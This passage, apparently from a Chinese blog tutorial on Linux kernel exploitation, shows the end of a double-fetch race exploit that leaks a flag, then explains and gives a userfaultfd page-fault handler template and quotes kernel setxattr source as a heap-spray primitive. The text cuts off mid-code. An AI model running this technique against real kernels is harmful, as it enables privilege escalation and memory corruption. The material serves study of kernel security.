class="number">16</span>;</span><br><span class="line">        flagKerneladdr = strtoull(flagIdxInBuf,flagIdxInBuf+<span class="number">16</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]flag addr: %p\n&quot;</span>,flagKerneladdr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;thread, <span class="literal">NULL</span>, changeFlagAddr,&amp;flagChunk);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;TRYTIME;i++)&#123;</span><br><span class="line">        flagJudgeFun(devFD,<span class="number">16</span>,&amp;flagBuf);</span><br><span class="line">    &#125;</span><br><span class="line">    finish = <span class="number">1</span>;</span><br><span class="line">    pthread_join(thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    close(devFD);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+]result is :&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">openDev</span><span class="params">(<span class="keyword">char</span>* pos)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> devFD;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open %s...\n&quot;</span>,pos);</span><br><span class="line">    <span class="keyword">if</span> ((devFD = open(pos, O_RDWR)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    Can&#x27;t open device file: %s\n&quot;</span>,pos);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> devFD;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">flagReadFun</span><span class="params">(<span class="keyword">int</span> devFD,<span class="keyword">int</span> len,<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    flagChunk.len = len;</span><br><span class="line">    flagChunk.flagUseAddr = buf;</span><br><span class="line">    ioctl(devFD,<span class="number">111</span>,&amp;flagChunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">flagJudgeFun</span><span class="params">(<span class="keyword">int</span> devFD,<span class="keyword">int</span> len,<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    flagChunk.len = len;</span><br><span class="line">    flagChunk.flagUseAddr = buf;</span><br><span class="line">    ioctl(devFD,<span class="number">222</span>,&amp;flagChunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">changeFlagAddr</span><span class="params">(<span class="keyword">void</span>* arg)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">flagStruct</span> * <span class="title">flagPTChunk</span> =</span> arg;</span><br><span class="line">    <span class="keyword">while</span>(finish==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//s1-&gt;flagUseAddr = flagKerneladdr;</span></span><br><span class="line">        flagPTChunk-&gt;flagUseAddr = flagKerneladdr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>æœ€åå¦‚ä¸‹æ•ˆæœï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211019152917.png" alt="image-20211019152909777"></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯åœ¨gccç¼–è¯‘çš„æ—¶å€™éœ€è¦åŠ ä¸Š<code>-lpthread</code>å¤šçº¿ç¨‹çš„å‚æ•°ã€‚è¿˜æœ‰çº¿ç¨‹çš„å›è°ƒå‡½æ•°å¿…é¡»ä¼ å…¥è‡³å°‘ä¸€ä¸ªå‚æ•°ï¼Œä¸ç®¡è¯¥å‚æ•°åœ¨é‡Œé¢æœ‰æ²¡æœ‰è¢«ç”¨åˆ°ã€‚</p>

        <h2 id="2-UserFaultFD"   >
          <a href="#2-UserFaultFD" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-UserFaultFD" class="headerlink" title="2.UserFaultFD"></a>2.UserFaultFD</h2>
      <p>å…³äºè¿™ä¸ªå®åœ¨æ˜¯æœ‰ç‚¹å¤šï¼Œæ¶‰åŠçš„çŸ¥è¯†ä¹Ÿæœ‰ç‚¹å¤šï¼Œå…·ä½“çš„å¯ä»¥çœ‹ï¼Œç‰ˆæœ¬åœ¨v4.3åŠä»¥ä¸Šæ‰å¯ç”¨</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://brieflyx.me/2020/linux-tools/userfaultfd-internals/" >Linux Kernel Userfaultfd å†…éƒ¨æœºåˆ¶æ¢ç©¶ - BrieflyXâ€™s Base</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253835#h3-5" >ä»å¼ºç½‘æ¯ 2021 çº¿ä¸Šèµ›é¢˜ç›® notebook ä¸­æµ…æ userfaultfd åœ¨ kernel pwn ä¸­çš„åˆ©ç”¨ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ä¸»è¦å°±æ˜¯ä½¿ç”¨æ–¹æ³•ï¼Œä»¥åŠæ˜¯å¦å¯ç”¨</p>

        <h3 id="1-æ˜¯å¦å¯ç”¨"   >
          <a href="#1-æ˜¯å¦å¯ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ˜¯å¦å¯ç”¨" class="headerlink" title="(1)æ˜¯å¦å¯ç”¨"></a>(1)æ˜¯å¦å¯ç”¨</h3>
      
        <h4 id="â‘ ç¼–è¯‘æ—¶"   >
          <a href="#â‘ ç¼–è¯‘æ—¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ ç¼–è¯‘æ—¶" class="headerlink" title="â‘ ç¼–è¯‘æ—¶"></a>â‘ ç¼–è¯‘æ—¶</h4>
      <p>åœ¨æˆ‘ä»¬ç¼–è¯‘å†…æ ¸çš„æ—¶å€™ï¼Œéœ€è¦åŠ å…¥å¦‚ä¸‹çš„é€‰é¡¹åœ¨.configä¸­</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_USERFAULTFD=y</span><br></pre></td></tr></table></div></figure>

<p>ä¸ç„¶å½“æˆ‘ä»¬å°è¯•ä½¿ç”¨å¦‚ä¸‹ä»£ç æ³¨å†Œæ—¶ï¼Œå°±ä¼šè¿”å›-1ï¼Œè¡¨ç¤ºå¤±è´¥</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡ç‰ˆæœ¬é™åˆ¶"   >
          <a href="#â‘¡ç‰ˆæœ¬é™åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡ç‰ˆæœ¬é™åˆ¶" class="headerlink" title="â‘¡ç‰ˆæœ¬é™åˆ¶"></a>â‘¡ç‰ˆæœ¬é™åˆ¶</h4>
      <p>åœ¨v5.11åŠä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­åŠ å…¥äº†å¦‚ä¸‹é™åˆ¶</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//fs/userfaultfd.c</span></span><br><span class="line"><span class="keyword">if</span> (!sysctl_unprivileged_userfaultfd &amp;&amp;</span><br><span class="line">    (flags &amp; UFFD_USER_MODE_ONLY) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">    !capable(CAP_SYS_PTRACE)) &#123;</span><br><span class="line">    printk_once(KERN_WARNING <span class="string">&quot;uffd: Set unprivileged_userfaultfd &quot;</span></span><br><span class="line">                <span class="string">&quot;sysctl knob to 1 if kernel faults must be handled &quot;</span></span><br><span class="line">                <span class="string">&quot;without obtaining CAP_SYS_PTRACE capability\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EPERM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¿…é¡»è¦æ˜¯rootæƒé™æ‰å¯ä»¥ä½¿ç”¨è¯¥æœºåˆ¶</p>

        <h3 id="2-ä½¿ç”¨æ–¹æ³•"   >
          <a href="#2-ä½¿ç”¨æ–¹æ³•" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="(2)ä½¿ç”¨æ–¹æ³•"></a>(2)ä½¿ç”¨æ–¹æ³•</h3>
      <p>æ¢ç©¶å®Œäº†æ˜¯å¦å¯ç”¨ï¼Œå†æ¥çœ‹çœ‹ä½¿ç”¨æ–¹æ³•ï¼ŒåŒæ ·åœ¨ä¸Šé¢ç»™å‡ºçš„é“¾æ¥ä¸­æœ‰ä¸€ä¸ªæ¿å­ï¼Œå°è¯•æ‹¿æ¥ç”¨ä¸€ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span>     *page = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">size_t</span>   page_size;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_t</span> monitor_thread;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerUserFaultFd</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> * <span class="title">test_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *uffd_buf_leak;</span><br><span class="line">    page = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">0x20</span> ; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        page[i] == <span class="string">&quot;\x62&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ç”³è¯·ä¸€å—ä¿æŠ¤å†…å­˜ï¼Œæˆ‘ä»¬å¯¹è¯¥å†…å­˜è¿›è¡Œè¯»å†™æ“ä½œå°±ä¼šè¢«userfaultfdç»™æ•è·ï¼Œä»è€Œè¿›å…¥åˆ°test_threadå‡½æ•°ä¸­</span></span><br><span class="line">    uffd_buf = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    registerUserFaultFd(uffd_buf, page_size, test_thread);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31;40m[Test:]%016llx\033[0m\n&quot;</span>,*uffd_buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> * <span class="title">test_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//è‡ªå®šä¹‰ä»£ç åŒºåŸŸ----------------------</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31;40m[Loading handler userfaultfd]%016llx\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="comment">//-------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ¤æ–­æ˜¯å¦æ­£ç¡®æ‰“å¼€</span></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ•°æ®æ‹·è´åŒºåŸŸ</span></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                          ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerUserFaultFd</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹æ•ˆæœï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203081748375.png"></p>
<p>å¯ä»¥çœ‹åˆ°åœ¨è¯•å›¾æ‰“å°è¢«æˆ‘ä»¬ç”³è¯·è¯»å†™ä¿æŠ¤çš„åŒºåŸŸæ—¶ï¼Œä¼šè°ƒç”¨åˆ°æˆ‘ä»¬çš„<code>test_thread</code>å‡½æ•°ä¸­</p>

        <h3 id="3-é…åˆçŸ¥è¯†ç‚¹"   >
          <a href="#3-é…åˆçŸ¥è¯†ç‚¹" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-é…åˆçŸ¥è¯†ç‚¹" class="headerlink" title="(3)é…åˆçŸ¥è¯†ç‚¹"></a>(3)é…åˆçŸ¥è¯†ç‚¹</h3>
      <p>é€šå¸¸æ„ä¹‰ä¸Šæ¥è®²ï¼ŒUserFaultFDæ˜¯ç”¨åœ¨å¤šçº¿ç¨‹ä¸‹ï¼Œç”¨æ¥åˆ¶é€ double-freeæˆ–è€…UAFçš„ã€‚è€Œåœ¨æ¯”è¾ƒä¸¥è‹›çš„æ¡ä»¶ä¸‹ï¼Œæ¯”å¦‚ï¼Œæ²¡æ³•å†™ï¼Œæˆ–è€…æ²¡åŠæ³•è¯»çš„æ—¶å€™ï¼Œå°±éœ€è¦é…åˆä»¥ä¸‹çš„ä¸¤ä¸ªçŸ¥è¯†ç‚¹ã€‚</p>

        <h4 id="setxattr"   >
          <a href="#setxattr" class="heading-link"><i class="fas fa-link"></i></a><a href="#setxattr" class="headerlink" title="setxattr"></a>setxattr</h4>
      <p>è°ƒç”¨é“¾ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYS_setxattr()-&gt;path_setxattr()-&gt;setxattr()</span><br></pre></td></tr></table></div></figure>

<p>ä»£ç å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//fs/xattr.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function"><span class="title">setxattr</span><span class="params">(struct user_namespace *mnt_userns, struct dentry *d,</span></span></span><br><span class="line"><span class="params"><span class="function">	 <span class="keyword">const</span> <span class="keyword">char</span> __user *name, <span class="keyword">const</span> <span class="keyword">void</span> __user *value, <span class="keyword">size_t</span> size,</span></span></span><br><span class="line"><span class="params"><span class="function">	 <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line">	<span class="keyword">void</span> *kvalue = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">char</span> kname[XATTR_NAME_MAX + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; ~(XATTR_CREATE|XATTR_REPLACE))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	error = strncpy_from_user(kname, name, <span class="keyword">sizeof</span>(kname));</span><br><span class="line">	<span class="keyword">if</span> (error == <span class="number">0</span> || error == <span class="keyword">sizeof</span>(kname))</span><br><span class="line">		error = -ERANGE;</span><br><span class="line">	<span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (size) &#123;</span><br><span class="line">		<span class="keyword">if</span> (size &gt; XATTR_SIZE_MAX)</span><br><span class="line">			<span class="keyword">return</span> -E2BIG;</span><br><span class="line">        <span class="comment">//ç”³è¯·chunkï¼ŒåŸºæœ¬ç›¸å½“äºkmallocå‡½æ•°ï¼Œsizeå¯æ§</span></span><br><span class="line">		kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!kvalue)</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="comment">//ä»valueæ‹·è´å†…å®¹åˆ°kvalueï¼Œvalueå¯æ§</span></span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line">			error = -EFAULT;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ((<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_ACCESS) == <span class="number">0</span>) ||</span><br><span class="line">		    (<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == <span class="number">0</span>))</span><br><span class="line">			posix_acl_fix_xattr_from_user(mnt_userns, kvalue, size);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	error = vfs_setxattr(mnt_userns, d, kname, kvalue, size, flags);</span><br><span class="line">out:</span><br><span class="line">    <span 